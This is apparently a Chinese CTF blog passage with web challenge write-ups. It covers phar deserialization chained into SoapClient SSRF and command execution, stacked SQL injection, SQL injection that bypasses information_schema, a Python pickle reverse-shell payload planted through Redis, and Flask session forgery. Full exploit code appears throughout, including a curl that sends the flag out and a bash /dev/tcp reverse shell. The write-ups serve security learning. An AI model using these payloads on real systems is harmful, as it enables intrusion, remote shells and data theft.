<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Go away!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">        $file-&gt;getMIME();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里限制了输入文件路径的开头，其实这里去看正则的内容，并不难想到phar反序列化，不过这里也放了一个绕过，形式如<code>phar://filter/resource=phar://test.phar</code></p>
<p>这里调用了getMIME函数，再来审计一下包括这个函数的整个File类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line"><span class="keyword">public</span> $type;</span><br><span class="line"><span class="keyword">public</span> $func = <span class="string">"Check"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name); </span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    finfo_close($finfo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name = $file_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos($data, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用finfo_open去检测传入文件名的type，这个函数是会调用底层函数<code>php_stream_open_wrapper</code>，所以会触发phar反序列化。很明显这个__wakeup函数是存在问题的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name); </span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>___wakeup魔术方法会在反序列化后调用，利用反射类反射出一个新的类，并且传参初始化，再去调用check如何，看起来非常符合下面的check类，但是如果我们可以自行控制$this-&gt;func，再去调用$this-&gt;filename进行初始化，最后调用check函数，这样就可以想到SoapClient调用不存在方法触发call魔术方法造成SSRF，说到触发这个SSRF，这样就会与admin.php产生联系了,（比赛没来得及打，用的是buuoj的复现，这里admin.php的代码不太一样，不过思路都是一个思路。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You r not admin!"</span>;</span><br></pre></td></tr></table></figure>

<p>这里如果是127.0.0.1才会调用Ad类，最终当对象销毁后再调用destruct去执行system，达到命令执行的目录。</p>
<p>仔细来分析一下这个check方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑的意思就是调用反射类执行出所传类的三种函数，并且这个check函数是一定要bypass是，不然会因为类和对应的方法不对应产生Fatal error报错导致程序终止，不能再对象销毁后调用destruct，使得无法进行命令执行，这里的类可以通过fuzz来找到这种类，例如SplStack ArrayIterator类分别对应的push和append方法。</p>
<p>所以最后的pop链大概的构造思路就是通过finfo_open触发phar反序列化进而调用__wakeup魔术方法，通过实例化SoapClient类，并且通过filename变量进行初始化，调用check这个不存在的方法，触发ssrf，带着参数访问admin.php，通过调用SplStack类中的push方法来bypass check函数，最终成功调用destruct魔术方法，进行命令执行,exp如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $file_name;</span><br><span class="line"><span class="keyword">public</span> $type;</span><br><span class="line"><span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $target = <span class="string">'http://127.0.0.1/admin.php'</span>;</span><br><span class="line">    $post_string = <span class="string">'admin=1&amp;cmd=curl http://7d6c515535a2/`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;file_name = [<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">"location"</span> =&gt; $target,<span class="string">"user_agent"</span>=&gt;<span class="string">"exp\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: profile=1"</span>.<span class="string">"\r\nContent-Length: "</span>.(string)strlen($post_string).<span class="string">"\r\n\r\n"</span>.$post_string,<span class="string">"uri"</span> =&gt; <span class="string">"http://127.0.0.1/"</span>)];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@file_put_contents(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);</span><br><span class="line">$exp=<span class="keyword">new</span> File();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($exp); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">"phar.phar"</span>,<span class="string">"phar.png"</span>);</span><br><span class="line">@unlink(<span class="string">"test.txt"</span>);</span><br></pre></td></tr></table></figure>

<p>生成phar.png传上去，访问php://filter/resource=phar://upload/fd40c7f4125a9b9ff1a4e75d293e3080/58e6a0c04177ebd5f43997d257e67ee5.png</p>
<p><img src="https://s2.ax1x.com/2019/08/27/m4GcP1.png" alt="m4GcP1.png"></p>
<p>最后发现像SplStack这种类还是很多的，例如</p>
<p><img src="https://s2.ax1x.com/2019/08/27/mIDsgg.png" alt="mIDsgg.png"></p>
<p>当然了，这只是我对于某一内置类Fuzz后的结果，还有其他内置类的。</p>
<p>上面的这个过程其实是非预期，预期的话还是很有意思的，在zsx师傅的博客中有指出</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190820154836-eaa31fbc-c31e-1.png" alt="img"></p>
<p>这个本来是wakeup而不是destruct是要通过Rogue Mysql去读我们的phar包触发反序列化来触发wakeup拿到flag，而且本来的代码其实是下面这个亚子的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2[<span class="number">0</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">1</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">2</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">3</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过下面的调用并且在自己的vps上开启伪造的恶意服务器就可以成功getflag，这个并没有去复现，因为思路其实差不多，多的是这个很棒的思路LOAD DATA LOCAL INFILE来触发反序列化，学习到了</p>
<p>payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$reflect = <span class="keyword">new</span> ReflectionClass(<span class="string">'Mysqli'</span>);</span><br><span class="line">$sql = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="string">'Mysqli'</span>, <span class="string">'init'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, $arr);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="string">'Mysqli'</span>, <span class="string">'real_connect'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, <span class="string">'ip'</span>,<span class="string">'root'</span>,<span class="string">'123456'</span>,<span class="string">'test'</span>,<span class="string">'3306'</span>);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="string">'Mysqli'</span>, <span class="string">'query'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, <span class="string">'select 1'</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">admin=<span class="number">1</span>&amp;clazz=Mysqli&amp;func1=init&amp;arg1=&amp;func2=real_connect&amp;arg2[<span class="number">0</span>]=<span class="number">106.14</span><span class="number">.153</span><span class="number">.173</span>&amp;arg2[<span class="number">1</span>]=root&amp;arg2[<span class="number">2</span>]=<span class="number">123</span>&amp;arg2[<span class="number">3</span>]=test&amp;arg2[<span class="number">4</span>]=<span class="number">3306</span>&amp;func3=query&amp;arg3=select%<span class="number">201</span>&amp;ip=<span class="number">106.14</span><span class="number">.153</span><span class="number">.173</span>&amp;port=<span class="number">2015</span><span class="string">';</span></span><br></pre></td></tr></table></figure>

<h3 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h3><p>这个题似乎因为正则和在线维护的问题除了一些小差错，本意是考sql_mode中的PIPES_AS_CONCAT模式将字符串 ||视为字符串的连接操作符而非或运算符，配合堆叠注入带出flag，源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">$BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line"><span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line"><span class="comment">//echo $post['query'];</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line"><span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">print_r($row);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>预期解法</p>
<p><img src="https://s2.ax1x.com/2019/08/27/m4D6gJ.png" alt="m4D6gJ.png"></p>
<p>payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;set sql_mode&#x3D;pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>

<p>非预期</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1;select *,1</span><br></pre></td></tr></table></figure>

<h3 id="Cocktail’s-Remix"><a href="#Cocktail’s-Remix" class="headerlink" title="Cocktail’s Remix"></a>Cocktail’s Remix</h3><p>这个并没有复现环境，但其实这个题的主要思路就是对cocktail.so的分析….我并不会逆向，只能放到IDA里硬着头皮跟着wp学学了</p>
<p>进入cocktail_handler，内容如下：</p>
<p><img src="https://s2.ax1x.com/2019/08/27/mI06JS.png" alt="mI06JS.png"></p>
<p>大概可以看出意思是从headers中拿到Reffer字段并且给j_remix处理，最后进行popen命令执行，跟进j_max看一下</p>
<p><img src="https://s2.ax1x.com/2019/08/27/mIBpFK.png" alt="mIBpFK.png"></p>
<p>跟着remix</p>
<p><img src="https://s2.ax1x.com/2019/08/27/mIBLh8.png" alt="mIBLh8.png"></p>
<p>是base64算法的逻辑，所以最终的思路是将base64编码的命令传给reffer,然后程序进行解码后命令执行。</p>
<h3 id="iCloudMusic"><a href="#iCloudMusic" class="headerlink" title="iCloudMusic"></a>iCloudMusic</h3><p>待学习一些二进制方面内容再看看</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU2019-Web题解</title>
    <url>/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>题目蛮不错的，学到了一些有意思的地方</p>
<h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>开始的时候没放不是xss的提示..就有点坑，当xss做了很久..</p>
<p>广告标题处存在注入，测试 1’xa,点击广告详情，发现报错，确认注入点</p>
<p>过滤了空格，用/**/代替就好了，因为这个是有回显的，所以直接用union select就行…(22字段是真的狠..，这里代替union select去测字段除了order by 还有group by ,payload为 group by 22,’1,在确认字段数为22后，开始注入，因为过滤了or，所以无法通过information….这样的payload拿到表名，不过可以想起想到时间看到的bypass information_schema，又看了下数据库的版本是八点多的，满足条件，用sys.schema_auto_increment_columns bypass下payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1&#39;</span><br></pre></td></tr></table></figure>

<p>拿到两个表名，一个是广告表名，一个是用户表，想着注入试试admin的密码</p>
<p>然后就是一个常规的无列名注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;c&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;&#39;a&#39;,&#39;b&#39;,&#39;c&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x&#x2F;**&#x2F;limit&#x2F;**&#x2F;1,1),3,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1&#39;</span><br></pre></td></tr></table></figure>

<p>拿到了一个md5值，去somd5解了一下，拿到flag</p>
<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>登陆进去提示redis，github找了一个弱密码测试脚本，发现密码是password，当时想两个思路，一个是通过redis主从复制去RCE，第二个是结合登陆去python 反序列化RCE</p>
<p>redis的主从复制rce受到的限制蛮大的，config等关键命令都被过滤了，目前应该也没有这种过滤关键命令的Bypass 方法，所以还是考虑用Python反序列化去rce</p>
<p>这里py2和py3的数据还是有一些差异的，当时没太细看，直接py3打redis了，后来发现这是py2</p>
<p><a href="https://imgse.com/i/QBQrkj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QBQrkj.md.png" alt="QBQrkj.md.png"></a></p>
<p>从上图看下对比.</p>
<p>二者生成的区别还是蛮大的，而这道题去get session看一下，明显是python2生成的，所以用py2打就可以了</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">		s = <span class="string">"bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1"</span></span><br><span class="line">		<span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">r = redis.Redis(host=<span class="string">'114.67.109.247'</span>,password=<span class="string">"password"</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>)</span><br><span class="line">r.set(<span class="string">"session:your_session"</span>, s)</span><br></pre></td></tr></table></figure>

<p>打之后刷新一下，vps上监听一下，获得反弹过来的shell</p>
<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>随便用户名和密码上去之后，发现有个upload功能，不过没有权限，怀疑可能是伪造用户这样,而且还看到了jwt，不过开始一直没看到secret key</p>
<p>login界面的源码是有提示404 not found的…，随便访问一个不存在的路由，拿到secret key为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure>

<p>之后就开始伪造jwt了，首先解密下目前的jwt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py decode -c <span class="string">"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTExMSIsInVzZXJuYW1lIjoiMTExMTEifQ.Xe9dTA.0muECEr4tz5rfatCoCkOpbMqxns"</span> -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">u'username'</span>: <span class="string">u'11111'</span>, <span class="string">u'password'</span>: <span class="string">u'1111'</span>, <span class="string">u'id'</span>: <span class="string">'100'</span>, <span class="string">u'is_login'</span>: <span class="literal">True</span>&#125;</span><br></pre></td></tr></table></figure>

<p>一般在开发中第一个用户都是admin，尝试将id改为1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager2.py encode -t <span class="string">"&#123;u'username': u'11111', u'password': u'1111', u'id': '1', u'is_login': True&#125;"</span> -s <span class="string">"keyqqqwwweee!@#$%^&amp;*"</span></span><br><span class="line"></span><br><span class="line">eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTExMSIsInVzZXJuYW1lIjoiMTExMTEifQ.Xe9eCA<span class="number">.7</span>pipbqFINq5xl2Qhu0jl_IO0ynM</span><br></pre></td></tr></table></figure>

<p>改下jwt刷新一下就可以上传了，并且拿到源码</p>
